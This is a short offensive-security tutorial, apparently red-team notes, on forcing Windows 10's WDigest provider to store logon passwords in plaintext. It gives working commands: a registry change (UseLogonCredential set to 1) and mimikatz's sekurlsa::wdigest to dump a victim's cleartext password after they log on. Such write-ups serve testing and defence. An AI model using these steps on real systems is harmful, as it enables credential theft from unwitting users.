# Forcing WDigest to Store Credentials in Plaintext

As part of WDigest authentication provider, Windows versions up to 8 and 2012 used to store logon credentials in memory in plaintext by default, which is no longer the case with newer  Windows versions. 

It is still possible, however, to force WDigest to store secrets in plaintext.

## Execution

Let's first make sure that wdigest is not storing credentials in plaintext on our target machine running Windows 10:

{% code title="attacker@victim" %}
```csharp
sekurlsa::wdigest
```
{% endcode %}

Note the password field is null:

![](../../.gitbook/assets/mimikatz-2.2.0-x64-oe.eo-5_13_2019-10_42_39-pm.png)

Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next time someone logs on to the target system:

{% code title="attacker@victim" %}
```csharp
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```
{% endcode %}

![](../../.gitbook/assets/mimikatz-2.2.0-x64-oe.eo-5_13_2019-10_44_54-pm.png)

Say, now the victim on the target system spawned another shell:

{% code title="victim@local" %}
```csharp
runas /user:mantvydas powershell
```
{% endcode %}

Running mimikatz for wdigest credentials now reveals the plaintext password of the victim user `mantvydas`:

![](../../.gitbook/assets/wdigestdemo.gif)

## References

{% embed url="https://p16.praetorian.com/blog/mitigating-mimikatz-wdigest-cleartext-credential-theft" %}



